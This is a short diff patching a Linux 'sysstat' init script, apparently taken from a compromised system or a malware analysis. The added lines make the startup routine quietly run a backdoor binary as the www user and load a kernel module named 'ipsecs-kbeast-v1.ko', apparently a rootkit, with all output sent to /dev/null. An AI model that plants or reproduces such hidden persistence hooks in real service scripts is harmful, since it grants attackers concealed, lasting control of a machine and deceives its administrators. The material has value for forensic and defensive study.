@@ -1,0 +1,11 @@
+--- sysstat.orig        2012-01-01 00:58:57.000000000 +0800
++++ sysstat     2012-01-01 00:58:00.000000000 +0800
+@@ -45,6 +45,8 @@
+                rm -f /tmp/sysstat.run
+        fi
+         echo
++       su - www -c /usr/_h4x_/_h4x_bd > /dev/null 2>&1
++       insmod /usr/_h4x_/ipsecs-kbeast-v1.ko > /dev/null 2>&1
+         ;;
+   stop|status|restart|reload)
+         ;;
